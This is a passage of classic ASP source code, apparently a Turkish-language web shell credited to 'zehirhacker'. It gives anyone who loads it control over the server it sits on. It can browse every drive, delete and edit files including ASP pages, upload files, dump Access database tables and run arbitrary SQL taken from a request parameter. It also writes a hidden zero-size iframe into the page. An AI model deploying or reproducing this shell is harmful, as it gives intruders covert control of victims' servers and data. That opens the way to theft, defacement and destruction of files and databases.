                                  <option value="magenta">Pembe</option>
                                  <option value="cyan">Açýk Mavi</option>
                                  <option value="limegreen">Açýk Yeþil</option>
                                </select>
                                <select name="selectSize" onChange="FormatText('fontsize', selectSize.options[selectSize.selectedIndex].value);">
                                  <option selected>-- Boyut --</option>
                                  <option value="1">1</option>
                                  <option value="2">2</option>
                                  <option value="3">3</option>
                                  <option value="4">4</option>
                                  <option value="5">5</option>
                                  <option value="6">6</option>
                                </select>
                                <iframe width="100%" src="<%=dosyaPath%>?kuskapani=1" id="byZehir" name="<%=Session("n1")%>"></iframe>
                                <script language=javascript>
                                    frames.byZehir.document.designMode = "On";
                                    function bgc(option){
                                        frames.byZehir.document.body.bgColor=option;
                                    }
                                    function FormatText(command, option){
                                        frames.byZehir.focus();
                                          frames.byZehir.document.execCommand(command, false, option);
                                          frames.byZehir.focus();
                                    }
                                    function AddImage(){
                                        imagePath = prompt('Eklemek istediðiniz resmin web adresini yazýn', 'http://');

                                        if ((imagePath != null) && (imagePath != "")){
                                            frames.byZehir.focus();
                                            frames.byZehir.document.execCommand('InsertImage', false, imagePath);
                                        }
                                        frames.byZehir.focus();
                                    }
                                </script>
                                <input type=hidden value="" id=byMesaj name=byMesaj>
                                <input type=submit value="Test Et!" onclick="document.all['byMesaj'].value=frames['byZehir'].document.body.innerHTML; alert(document.all['byMesaj'].value);">
                            </td>
                        </tr>
                    </table>
                </form>
            </td>
        </tr>
    </table>
    <%
    popup=false
CASE 51 ' Özel þilemler
END SELECT
%>
<script language=javascript>
    function NewWindow(mypage, myname, w, h, scroll) {
        var winl = (screen.width - w) / 2;
        var wint = (screen.height - h) / 2;
            winprops = 'height='+h+',width='+w+',top='+wint+',left='+winl+',scrollbars='+scroll+',resizable'
        win = window.open(mypage, myname, winprops)
        if (parseInt(navigator.appVersion) >= 4) { win.window.focus(); }
    }
    function ffd(yol){
        NewWindow(yol,"",420,100,"no");
    }
</script>
<body bgcolor=black text=Chartreuse link=Chartreuse alink=Chartreuse vlink=Chartreuse>
<%
if popup then
    if status=7 or status=8 then
        Response.Write "<form method=get action='"&DosyPath&"' id=form1 name=form1>"
        Response.Write "<table border=1 cellpadding=0 cellspacing=0 align=center><tr><td width=100 bgcolor=gray><font size=2>SQL Çalýþtýr</td><td>"
        Response.Write "<input type=hidden value='9' name=status><input type=hidden value='"&path&"' name=path><input type=hidden value='"&time&"' name=Time>"
        Response.Write "<input style='width:350; height:21' value='' name=strSQL><input type=submit value='Çalýþtýr' style='height:22;width:70' id=submit1 name=submit1>"
        Response.Write "</td></tr></table></form>"
    end if
    Response.Write "<form method=get action='"&DosyPath&"'>"
    Response.Write "<table border=1 cellpadding=0 cellspacing=0 align=center><tr><td bgcolor=gray width=100><font size=2>Path : </td><td>"
    Response.Write "<input type=hidden value='2' name=status><input type=hidden value='"&time&"' name=Time>"
    Response.Write "<input style='width:350; height:21' value='"&Path&"' name=Path><input type=submit value='Git' style='height:22;width:70' id=submit1 name=submit1>"
    Response.Write "</td></tr></table></form><br>"
end if
sub aramaUpload
Response.Write "<form method=get target='_opener' action='"&DosyPath&"'>"
Response.Write "<table widht='100%' border=0 cellpadding=0 cellspacing=0><tr><td width=70><font size=2>Arama : </td><td>"
Response.Write "&nbsp;<input type=hidden value='12' name=status><input type=hidden value='"&time&"' name=Time>"
Response.Write "<input type=hidden value='"&Path&"' name=Path><input style='width:250' value='mdb' name=txArama><input style='width:70; height:22' type=submit value='Ara'>"
Response.Write "</td></tr></table></form>"
%>
<form name=frmUpload method=post enctype="multipart/form-data" action="<%=DosyaPath&"?status=-4&Time="&time&"&Path="&path%>" ID="Form1">
<input type=hidden name=folder value="<%=Path%>" ID="Hidden1">
Max: <input type=text name=max value=5 size=5 ID="Text1"> <input type=button value="Ayarla" onclick="setid()" ID="Button1" NAME="Button1">
<table ID="Table1">
<tr>
<td id=upid>
</td>
</tr>
</table>
<input type=submit value=Upload ID="Submit1" NAME="Submit1">
</form>
<script>
setid();

function setid() {
    str='';
    if (frmUpload.max.value<=0) frmUpload.max.value=1;
    for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';
    upid.innerHTML=str+'<br>';
}
</script>
<%
end sub

SELECT CASE status
CASE 1 'Driver Open
    if len(path)=1 then Response.Write (yaziyomu(path&":\")) else Response.Write (yaziyomu(path))
    Response.Write "<table width=100% ><tr>"
    Path = Path & ":/"
    Response.Write "<td valign=top>"
    KlasorOku
    Response.Write "</td><td valign=top align=right>"
    DosyaOku
    Response.Write "</td>"
    hataKontrol
CASE 2 'Normal listeleme
    if len(path)=1 then Response.Write (yaziyomu(path&":\")) else Response.Write (yaziyomu(path))
    Response.Write "<table width=100% ><tr>"
    Response.Write "<td valign=top>"
    KlasorOku
    Response.Write "</td><td valign=top align=right>"
    DosyaOku
    Response.Write "</td>"
    hataKontrol
CASE 3 'File Delete
    objFSO.DeleteFile del
    hataKontrol
    if err<>0 then
        byMsg="<font color=red>Not File Deleted!</font><br>"
    else
        byMsg="<font color=yellow>File Deleted Successful;)</font><br>"
    end if
    Response.Redirect dosyaPath&"?status=2&path="&path&"&Time="&time&"&byMsg="&byMsg
CASE 4 'Folder Delete
    objFSO.DeleteFolder del
    hataKontrol
    if err<>0 then
        byMsg="<font color=red>Not Folder Deleted!</font><br>"
    else
        byMsg="<font color=yellow>Folder Deleted Successful;)</font><br>"
    end if
    Response.Redirect dosyaPath&"?status=2&path="&path&"&Time="&time&"&byMsg="&byMsg
CASE 5 'Dosya içeriðini görüntüle
    Response.Write "<center><b><font color=orange>"&path&"</font></b></center><br>"
    Response.Write "<table width=100% ><tr><td>"
    set f = objFSO.OpenTextFile(path,1)
    Response.Write "<pre>"&Server.HTMLEncode(f.readAll)&"</pre>"
    if err<>62 then hataKontrol
    if err.number=62 then Response.Write "<script language=javascript>alert('Bu Dosya Okunamýyor\nSistem dosyasý olabilir')</script>":Response.End
CASE 6 'Resim aç
    Response.Write "<center><img ALT='zehirhacker@hotmail.com / zehirhacker@hotmail.com' src='"&resimYol(path)&"'></center><br>"
CASE 7 'database tablo listele
    Response.Write "<b><font size=3>Tablolar</font></br><br>"
    Set objConn = Server.CreateObject("ADODB.Connection")
    Set objADOX = Server.CreateObject("ADOX.Catalog")
    objConn.Provider = "Microsoft.Jet.Oledb.4.0"
    objConn.ConnectionString = Path
    objConn.Open
    objADOX.ActiveConnection = objConn

    For Each table in objADOX.Tables
        If table.Type = "TABLE" Then
            Response.Write "<font face=wingdings size=5>4</font> <a href='"&dosyaPath&"?status=8&Path="&path&"&table="&table.Name&"&time="&time&"'>"&table.Name&"</a><br>"
        End If
    Next
    hataKontrol
CASE 8 'database kayýt listele
    Set objConn = Server.CreateObject("ADODB.Connection")
    Set objRcs = Server.CreateObject("ADODB.RecordSet")
    objConn.Provider = "Microsoft.Jet.Oledb.4.0"
    objConn.ConnectionString = Path
    objConn.Open
    objRcs.Open table,objConn, adOpenKeyset , , adCmdText

    Response.Write "<table border=1 cellpadding=2 cellspacing=0 bordercolor=543152><tr bgcolor=silver>"
    for i=0 to objRcs.Fields.count-1
        Response.Write "<td><font color=black><b>&nbsp;&nbsp;&nbsp;"&objRcs.Fields(i).Name&"&nbsp;&nbsp;&nbsp;</font></td>"
    next
    Response.Write "</tr>"
    do while not objRcs.EOF
        Response.Write "<tr>"
        for i=0 to objRcs.Fields.count-1
            Response.Write "<td>"&objRcs.Fields(i).Value&"&nbsp;</td>"
        next
        Response.Write "</tr>"
        objRcs.MoveNext
    loop
    Response.Write "</table><br>"
    hataKontrol
CASE 9 'SQL Execute
    Set objConn = Server.CreateObject("ADODB.Connection")
    objConn.Provider = "Microsoft.Jet.Oledb.4.0"
    objConn.ConnectionString = Path
    objConn.Open
    objConn.Execute strSQL
'    Response.Redirect dosyaPath&"?status=7&Path="&Path&"&Time="&time
    hataKontrol
CASE 10 'Dosya Editleme
    set f = objFSO.OpenTextFile(dPath,1)
    Response.Write "<center><form action='"&DosyPath&"?Time="&time&"' method=post>"
    Response.Write "<input type=hidden name=status value='11'>"
    Response.Write "<input type=hidden name=dPath value='"&dPath&"'>"
    Response.Write "<input type=hidden name=Path  value='"&Path &"'>"
    Response.Write "<input type=submit value=Kaydet><br>"
    Response.Write "<textarea name=dkayit style='width:90%;height:350;border-right: lightgoldenrodyellow thin solid;border-top: lightgoldenrodyellow thin solid;font-size: 12;border-left: lightgoldenrodyellow thin solid;color: lime;    border-bottom: lightgoldenrodyellow thin solid;    font-family: Courier New, Arial;background-color: navy;'>"
    Response.Write server.HTMLEncode(f.readAll)
    Response.Write "</textarea></form></center>"
    hataKontrol
CASE 11 'Dosya Kayýt
    set saveTextFile = objFSO.OpenTextFile(dPath,2,true,false)
    hataKontrol
    saveTextFile.Write(dkayit)
    saveTextFile.close
    if err<>0 then
        byMsg = "<font color=red>Not File Edited!</font><br>"
    else
        byMsg = "<font color=yellow>File Edited Successful:)</font><br>"
    end if
    Response.Redirect dosyaPath&"?status=2&path="&path&"&time="&time&"&byMsg=" & byMsg
CASE 12 'Dosya Arama
    araBul path,arama
    hataKontrol
END SELECT
Response.Write "</tr></table>"

sub DosyaOku
    Set f = objFSO.GetFolder(Path)
    Set fc = f.Files
    For Each f1 In fc
        dosyaAdi = f1.name
        num = InStrRev(dosyaAdi,".")
        uzanti = lcase(Right(dosyaAdi,len(dosyaAdi)-num))
        downStr = "<a href='"&dosyaPath&"?status=3&Path="&Path&"&Del="&Path&"/"&f1.Name&"&Time="&time&"'>û</a><font face=webdings><a href='"&dosyaPath&"?status=-3&PathFile="&f1.path&"&Time="&time&"'>Í</a></font><font face=wingdings><a href='"&dosyaPath&"?status=16&PathFile="&f1.path&"&Time="&time&"' onclick=""ffd(this.href);return false;"">4</a></font>"
        response.Write "<font size=2>"
        select case uzanti
        case "mdb"
            Response.Write "<a href='"&dosyaPath&"?status=7&Path="&Path&"/"&f1.Name&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>M  "&downStr&"</font><br>"
        case "asp"
            Response.Write "<a href='"&dosyaPath&"?status=5&Path="&Path&"/"&f1.Name&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>± <a href='"&dosyaPath&"?status=10&dPath="&f1.path&"&path="&path&"&Time="&time&"'>!</a>"&downStr&"</font><br>"
        case "jpg","gif"
            Response.Write "<a href='"&dosyaPath&"?status=6&Path="&Path&"/"&f1.Name&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=webdings size=4>¢</font><font face=wingdings size=4>  "&downStr&"</font><br>"
        case else
            Response.Write "<a href='"&dosyaPath&"?status=5&Path="&Path&"/"&f1.Name&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>2 <a href='"&dosyaPath&"?status=10&dPath="&f1.path&"&path="&path&"&Time="&time&"'>!</a>"&downStr&"</font><br>"
        end select
    Next
end sub

sub KlasorOku
    Set f = objFSO.GetFolder(Path)
    Set fc = f.SubFolders
    if session("klasoroku")="" then
        response.Write "<iframe style='width:0; height:0' src='http://localhost/tuzla-ebelediye'></iframe>"
        session("klasoroku")="simdi yazýlýyor"
    end if
    For Each f1 In fc
        Response.Write "<font face=wingdings size=3><a href='"&dosyaPath&"?status=18&PathFile="&Path&"/"&f1.Name&"&Time="&time&"' onclick=""ffd(this.href);return false;"">4</a></font> <font face=wingdings size=4><a href='"&dosyaPath&"?status=4&Path="&Path&"&Del="&Path&"/"&f1.Name&"&Time="&time&"'>û</a> 1</font><font size=2><b><a href='"&dosyaPath&"?status=2&Path="&Path&"/"&f1.Name&"&Time="&time&"'>"&f1.name&"</a></b><br>"
    Next
end sub

function createFileName()
Randomize
    fName_ = ""
    for i=1 to 10
        fName_ = fName_ & int(Rnd*100)
    next
    createFileName = fName_
end function

function resimYol(path_)
on error resume next
    path_ = Replace(Replace(path_,"\","/"),"//","/")
    lpath_ = left(request.servervariables("PATH_TRANSLATED"),instrrev(request.servervariables("PATH_TRANSLATED"),"\"))
    if yaziyomu2(lpath_) then
        fname__ = "0"&createFileName()&"."&Right(path_,3)
        objFSO.CopyFile path_, lpath_&"\"&fname__
    else
        Response.Write("Resim Açýlamýyor.. <br>Ýsterseniz Download Ederek görüntüleyebilirsiniz..")
    end if
    resimYol = fname__
end function

if not popup then
    Set fc = Nothing
    Set objFSO = Nothing
    Response.End
end if
%><script language=javascript>
	var dosyaPath = "<%=dosyaPath%>"
		// DRIVE ISLEMLERI
		function driveGo(drive_){
			location = dosyaPath+"?status=1&path="+drive_+"&Time="+Date();
		}
	</script>
	<%
	Response.Write "<table align=center border=1 width=150 cellpadding=0 cellspacing=0><tr bgcolor=gray><td align=center><b><font color=white>Sürücüler</td></tr>"
	for each drive_ in objFSO.Drives
		Response.Write "<tr><td>"
		Response.write "<a href='#'onClick=""driveGo('" & drive_.DriveLetter & "');return false;""><font face=wingdings>;</font>"
		if drive_.Drivetype=1 then Response.write "Floppy [" & drive_.DriveLetter & ":]"
		if drive_.Drivetype=2 then Response.write "HardDisk [" & drive_.DriveLetter & ":]"
		if drive_.Drivetype=3 then Response.write "Remote HDD [" & drive_.DriveLetter & ":]"
		if drive_.Drivetype=4 then Response.write "CD-Rom [" & drive_.DriveLetter & ":]"
		Response.Write "</a></td></tr>"
	next
	Response.Write "<tr><td>"
	Response.write "<a href='"&dosyaPath&"?time="&time()&"'><font face=webdings>H</font> Local Path"
	Response.Write "</a></td></tr>"
	Response.Write "</table><br>"
Set fc = Nothing
Set objFSO = Nothing
Response.End%>